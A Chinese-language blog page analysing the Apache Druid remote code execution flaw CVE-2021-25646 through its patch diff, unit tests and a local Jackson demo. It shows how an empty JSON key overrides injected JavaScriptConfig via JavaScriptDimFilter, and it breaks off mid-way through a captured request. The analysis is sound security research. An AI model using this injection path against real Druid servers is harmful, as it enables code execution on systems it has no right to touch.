<!DOCTYPE html>
<html lang=zh-CN>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta property="og:description" content="">
    <meta property="og:type" content="website">
    <meta name="description" content="">
    <meta name="keyword"  content="">
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        Druid远程代码执行漏洞分析（CVE-2021-25646） - undefined
        
    </title>

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/aircloud.css">

    
<link rel="stylesheet" href="/css/gitment.css">

    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>

    









<meta name="generator" content="Hexo 6.3.0"></head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
    <i> 常记常新 </i>
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar ">
            <img src="/img/avatar.jpg" />
        </div>
        <div class="name">
            <i>LH</i>
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li >
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>主页</span>
                </a>
            </li>
            <li >
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>标签</span>
                </a>
            </li>
            <li >
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>存档</span>
                </a>
            </li>
            <li >
                <a href="/collect/">
                    <i class="iconfont icon-shoucang1"></i>
                    <span>收藏</span>
                </a>
            </li>
            <li >
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>关于</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>搜索</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-text">背景</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91"><span class="toc-text">漏洞触发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-text">其他</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%8F%8A%E5%BC%95%E7%94%A8"><span class="toc-text">参考及引用</span></a>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-bg" id="search-bg"></div>
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input"/>
            <span id="begin-search">搜索</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i> 常记常新 </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        Druid远程代码执行漏洞分析（CVE-2021-25646）
    </div>

    <div class="post-meta">
        <span class="attr">发布于：<span>2021-03-02 23:54:38</span></span>
        
        <span class="attr">标签：/
        
        <a class="tag" href="/tags/#漏洞复现" title="漏洞复现">漏洞复现</a>
        <span>/</span>
        
        <a class="tag" href="/tags/#漏洞分析" title="漏洞分析">漏洞分析</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
</span>
</span>
    </div>
    <div class="post-content ">
        <p>本文首发于先知社区:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9229">https://xz.aliyun.com/t/9229</a></p>
<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>通过分析漏洞的原理，学习大佬的挖洞思路，以及根据commit和diff分析poc的构造思路。</p>
<p>一些前置的jackson注解相关知识</p>
<ul>
<li><p>JacksonInject</p>
<p>假设json字段有一些缺少的属性，转换成实体类的时候没有的属性将为null,但是我们在某些需求当中需要将为null的属性都设置为默认值，这时候我们就可以用到这个注解了，它的功能就是在反序列化的时候将没有的字段设置为我们设置好的默认值</p>
</li>
<li><p>JsonProperty</p>
<p>此注解用于属性上，作用是把该属性的名称序列化为另外一个名称</p>
</li>
<li><p>JsonValue </p>
<p>可以用在get方法或者属性字段上，一个类只能用一个，当加上@JsonValue注解时，该类的json化结果，只有这个get方法的返回值，而不是这个类的属性键值对.</p>
</li>
<li><p>JsonCreator </p>
<p>当json在反序列化时，默认选择类的无参构造函数创建类对象，没有无参构造函数时会报错，JsonCreator作用就是指定一个有参构造函数供反序列化时调用。 该构造方法的参数前面需要加上@JsonProperty,否则会报错。</p>
</li>
<li><p>JsonTypeInfo</p>
<p>作用于类或接口，被用来处理多态类型的序列化及反序列化。</p>
</li>
</ul>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>先看GitHub上的diff</p>
<p><a target="_blank" rel="noopener" href="https://github.com/apache/druid/compare/0.20.0...0.20.1" title="https://github.com/apache/druid/compare/0.20.0...0.20.1">https://github.com/apache/druid/compare/0.20.0...0.20.1</a></p>
<p>commit记录不太多，且包含一些版本号更迭相关的commit记录，在commit记录中可以看到，这个commit记录最契合此次漏洞。</p>
<p><img src="/img/druid/image_AlOYP4x9U9.png"></p>
<p>几个修改点</p>
<ul>
<li><p>core&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;apache&#x2F;druid&#x2F;guice&#x2F;DruidSecondaryModule.java#setupJackson</p>
<p>这个函数的作用是给jackson的ObjectMapper 对象增加InjectableValues的值。用于处理jackson反序列化对象的JacksonInject注解。</p>
<p>没有逻辑修改，只是函数封装了一下</p>
</li>
<li><p>core&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;apache&#x2F;druid&#x2F;guice&#x2F;GuiceAnnotationIntrospector.java</p>
<p>这个类改动很大，而且加了很多关键的注释。</p>
<p>重写了一个方法<code>findPropertyIgnorals</code>，注释给出的解释是：</p>
<blockquote>
<p>这个方法用来在jackson反序列化中找到哪些属性需要忽略掉。jackson会在处理每一个类的每一个构造方法参数时调用这个方法。</p>
<p>如果用户传入的属性有JsonProperty注解，则会返回<code>JsonIgnoreProperties.Value.empty()</code>，否则这个函数会返回<code>JsonIgnoreProperties.Value.forIgnoredProperties(&quot;&quot;)</code>,也就是不允许传入属性名为空的字段。<br>在这个函数的内部也写了一段注释讲了为什么要写这个函数，翻译如下：<br>我们在任何情况下都不应该允许空字段名。然而在Jackson的反序列化中就存在一个已知的bug忽略了这一点（详情见<a target="_blank" rel="noopener" href="https://github.com/FasterXML/jackson-databind/issues/3022" title="https://github.com/FasterXML/jackson-databind/issues/3022">https://github.com/FasterXML/jackson-databind/issues/3022</a>），这个bug导致了即使数组中都是合法的字段，依然会反序列化失败。为了解决这个bug，当接收到的属性带着JsonProperty 并且需要被反序列化时，我们返回了一个empty，这才是合理的，因为每一个带着JsonProperty 的属性都应该有一个不为空的名字，如果jackson修复了这个bug，我们就会移除这段函数检查。<br>这个新函数也很简单</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> JsonIgnoreProperties.Value <span class="title function_">findPropertyIgnorals</span><span class="params">(Annotated ac)</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (ac <span class="keyword">instanceof</span> AnnotatedParameter) &#123;</span><br><span class="line">      <span class="keyword">final</span> <span class="type">AnnotatedParameter</span> <span class="variable">ap</span> <span class="operator">=</span> (AnnotatedParameter) ac;</span><br><span class="line">      <span class="keyword">if</span> (ap.hasAnnotation(JsonProperty.class)) &#123;</span><br><span class="line">        <span class="keyword">return</span> JsonIgnoreProperties.Value.empty();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> JsonIgnoreProperties.Value.forIgnoredProperties(<span class="string">&quot;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>如果注解不继承AnnotatedParameter并且不带有JsonProperty，则会返回JsonIgnoreProperties.Value.forIgnoredProperties(“”)，即忽略这个参数，这个函数默认的方式是直接返回JsonIgnoreProperties.Value.empty()</p>
<p>com.fasterxml.jackson.databind.AnnotationIntrospector.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Value <span class="title function_">findPropertyIgnorals</span><span class="params">(Annotated ac)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Value.empty();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>光有这些信息，还是没有看清楚到底漏洞在哪，原因是对于jackson的这个bug理解不够。大概能理解的意思是，程序原本会反序列化所有字段，但是现在如果字段没有带有JsonProperty就会被忽略掉。</p>
<p>结合这次commit中的Test信息，能更清楚的看懂这个漏洞。</p>
<p>新增测试类core&#x2F;src&#x2F;test&#x2F;java&#x2F;org&#x2F;apache&#x2F;druid&#x2F;guice&#x2F;DruidSecondaryModuleTest.java。代码中包含了两个反序列化测试类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ClassWithJacksonInject</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> String test;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> InjectedParameter injected;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@JsonCreator</span></span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">ClassWithJacksonInject</span><span class="params">(</span></span><br><span class="line"><span class="params">      <span class="meta">@JsonProperty(&quot;test&quot;)</span> String test,</span></span><br><span class="line"><span class="params">      <span class="meta">@JacksonInject</span> InjectedParameter injected</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">this</span>.test = test;</span><br><span class="line">    <span class="built_in">this</span>.injected = injected;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@JsonProperty</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getTest</span><span class="params">()</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> test;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ClassWithEmptyProperty</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> String test;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> InjectedParameter injected;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@JsonCreator</span></span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">ClassWithEmptyProperty</span><span class="params">(</span></span><br><span class="line"><span class="params">      <span class="meta">@JsonProperty(&quot;test&quot;)</span> String test,</span></span><br><span class="line"><span class="params">      <span class="meta">@JacksonInject</span> <span class="meta">@JsonProperty(&quot;&quot;)</span> InjectedParameter injected</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">this</span>.test = test;</span><br><span class="line">    <span class="built_in">this</span>.injected = injected;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@JsonProperty</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getTest</span><span class="params">()</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> test;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在test中找用到了这两个类的方法</p>
<p>先看第一个，ClassWithJacksonInject</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testInjectWithAnEmptyPropertyNotOverrideInjection</span><span class="params">()</span> <span class="keyword">throws</span> JsonProcessingException</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">final</span> <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">  props.setProperty(PROPERTY_NAME, PROPERTY_VALUE);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">final</span> <span class="type">Injector</span> <span class="variable">injector</span> <span class="operator">=</span> makeInjectorWithProperties(props);</span><br><span class="line">  <span class="keyword">final</span> <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> makeObjectMapper(injector);</span><br><span class="line">  <span class="keyword">final</span> <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;test\&quot;: \&quot;this is an injection test\&quot;, \&quot;\&quot;: \&quot;nice try\&quot; &#125;&quot;</span>;</span><br><span class="line">  <span class="keyword">final</span> <span class="type">ClassWithJacksonInject</span> <span class="variable">object</span> <span class="operator">=</span> mapper.readValue(json, ClassWithJacksonInject.class);</span><br><span class="line">  Assert.assertEquals(<span class="string">&quot;this is an injection test&quot;</span>, object.test);</span><br><span class="line">  Assert.assertEquals(PROPERTY_VALUE, object.injected.val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testInjectNormal</span><span class="params">()</span> <span class="keyword">throws</span> JsonProcessingException</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">final</span> <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">  props.setProperty(PROPERTY_NAME, PROPERTY_VALUE);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">final</span> <span class="type">Injector</span> <span class="variable">injector</span> <span class="operator">=</span> makeInjectorWithProperties(props);</span><br><span class="line">  <span class="keyword">final</span> <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> makeObjectMapper(injector);</span><br><span class="line">  <span class="keyword">final</span> <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;test\&quot;: \&quot;this is an injection test\&quot; &#125;&quot;</span>;</span><br><span class="line">  <span class="keyword">final</span> <span class="type">ClassWithJacksonInject</span> <span class="variable">object</span> <span class="operator">=</span> mapper.readValue(json, ClassWithJacksonInject.class);</span><br><span class="line">  Assert.assertEquals(<span class="string">&quot;this is an injection test&quot;</span>, object.test);</span><br><span class="line">  Assert.assertEquals(PROPERTY_VALUE, object.injected.val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两个方法区别在第一个多了一个name为””的字段，在本地模拟一下，创建如下类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JsonCreator</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(</span></span><br><span class="line"><span class="params">            <span class="meta">@JsonProperty(&quot;name&quot;)</span>String name,</span></span><br><span class="line"><span class="params">            <span class="meta">@JacksonInject</span> String trueName</span></span><br><span class="line"><span class="params">    )</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.trueName=trueName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String trueName;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTrueName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> trueName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTrueName</span><span class="params">(String trueName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.trueName = trueName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造方法中两个参数，一个带有JsonProperty注解一个带有JacksonInject 注解，按照druid的commit中的方法进行数据输入，带有JsonProperty标签的置值，并带一个””名字的数据</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String json= <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;name is one\&quot;,\&quot;\&quot;:\&quot;trueName is two\&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>结果是JacksonInject 标签的属性被置入了字段为””的值</p>
<p><img src="/img/druid/image_nkgiO4sflN.png"></p>
<p>接着测试第二种反序列化类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JsonCreator</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(</span></span><br><span class="line"><span class="params">            <span class="meta">@JsonProperty(&quot;name&quot;)</span>String name,</span></span><br><span class="line"><span class="params">            <span class="meta">@JacksonInject</span> <span class="meta">@JsonProperty(&quot;&quot;)</span> String trueName</span></span><br><span class="line"><span class="params">    )</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.trueName=trueName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String trueName;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTrueName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> trueName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTrueName</span><span class="params">(String trueName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.trueName = trueName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还是使用上面相同的payload发现也被成功置值。通过两个测试可以发现，jackson反序列化对象的JacksonInject 注解的属性会被名为<code>&quot;&quot;</code>的字段填充。</p>
<h2 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h2><p>现在已知的利用点是可以利用””为键名将用户自定义的数据匹配到JacksonInject 注解修饰的字段中。</p>
<p>在druid中搜索@JacksonInject，匹配到的数据很多，<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw" title="https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw">https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw</a>这篇文章中使用的是org.apache.druid.query.filter.JavaScriptDimFilter类，它的构造函数参数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">JavaScriptDimFilter</span><span class="params">(</span></span><br><span class="line"><span class="params">      <span class="meta">@JsonProperty(&quot;dimension&quot;)</span> String dimension,</span></span><br><span class="line"><span class="params">      <span class="meta">@JsonProperty(&quot;function&quot;)</span> String function,</span></span><br><span class="line"><span class="params">      <span class="meta">@JsonProperty(&quot;extractionFn&quot;)</span> <span class="meta">@Nullable</span> ExtractionFn extractionFn,</span></span><br><span class="line"><span class="params">      <span class="meta">@JsonProperty(&quot;filterTuning&quot;)</span> <span class="meta">@Nullable</span> FilterTuning filterTuning,</span></span><br><span class="line"><span class="params">      <span class="meta">@JacksonInject</span> JavaScriptConfig config</span></span><br><span class="line"><span class="params">  )</span></span><br></pre></td></tr></table></figure>

<p>config变量原本应该由Druid重写的GuiceInjectableValues类控制，从配置文件中读取并传入，但是这里其实用户可控。在该类的toFilter方法获取到了由fuciton参数生成的JavaScriptPredicateFactory对象，这个对象是可以执行java代码的，在反序列化的过程中最终会调用。导致任意代码执行。</p>
<p>知道了漏洞原理，下一步分析一下如何触发漏洞。由于对druid框架也不是特别了解，因此无法做到完全从source往后分析，只能结合实际操作中的一些现象，以及下断点调试，猜测作者的漏洞利用思路</p>
<p>在druid中，load data模块有大量用户输入json的操作的地方，这个模块是用来向服务器上传数据的，选择example data</p>
<p><img src="/img/druid/image_12WzJ5gw_S.png"></p>
<p>它会从云端加载一些示例数据，</p>
<p><img src="/img/druid/image_8lUMYYUHNh.png"></p>
<p>点击next即可将数据粘贴到本地，接着配置下__time。</p>
<p><img src="/img/druid/image_kdjL6YKI7P.png"></p>
<p>下一步的transform和filter则是漏洞触发的相关部分，快进到filter配置，因为我们的恶意类就是一个filter，如果该类能够反序列化，那么大概率是在这个步骤中实现</p>
<p><img src="/img/druid/image_Y-1Aw06L6I.png"></p>
<p>有部分filter的type可以选择，随便填写一下，此时点击next，同时F12抓包，可以看到向服务端query了这样一段数据</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;index&quot;</span>, </span><br><span class="line">    <span class="string">&quot;spec&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;ioConfig&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;index&quot;</span>, </span><br><span class="line">            <span class="string">&quot;inputSource&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;inline&quot;</span>, </span><br><span class="line">                <span class="string">&quot;data&quot;</span>: <span class="string">&quot;&#123;\&quot;isRobot\&quot;:true,\&quot;channel\&quot;:\&quot;#sv.wikipedia\&quot;,\&quot;timestamp\&quot;:\&quot;2016-06-27T00:00:11.080Z\&quot;,\&quot;flags\&quot;:\&quot;NB\&quot;,\&quot;isUnpatrolled\&quot;:false,\&quot;page\&quot;:\&quot;Salo Toraut\&quot;,\&quot;diffUrl\&quot;:\&quot;https://sv.wikipedia.org/w/index.php?oldid=36099284&amp;rcid=89369918\&quot;,\&quot;added\&quot;:31,\&quot;comment\&quot;:\&quot;Botskapande Indonesien omdirigering\&quot;,\&quot;commentLength\&quot;:35,\&quot;isNew\&quot;:true,\&quot;isMinor\&quot;:false,\&quot;delta\&quot;:31,\&quot;isAnonymous\&quot;:false,\&quot;user\&quot;:\&quot;Lsjbot\&quot;,\&quot;deltaBucket\&quot;:0.0,\&quot;deleted\&quot;:0,\&quot;namespace\&quot;:\&quot;Main\&quot;&#125;</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line">            &#125;, </span><br><span class="line">            <span class="string">&quot;inputFormat&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;json&quot;</span>, </span><br><span class="line">                <span class="string">&quot;keepNullColumns&quot;</span>: <span class="literal">true</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, </span><br><span class="line">        <span class="string">&quot;dataSchema&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;dataSource&quot;</span>: <span class="string">&quot;sample&quot;</span>, </span><br><span class="line">            <span class="string">&quot;timestampSpec&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;column&quot;</span>: <span class="string">&quot;timestamp&quot;</span>, </span><br><span class="line">                <span class="string">&quot;format&quot;</span>: <span class="string">&quot;iso&quot;</span></span><br><span class="line">            &#125;, </span><br><span class="line">            <span class="string">&quot;dimensionsSpec&quot;</span>: &#123; &#125;, </span><br><span class="line">            <span 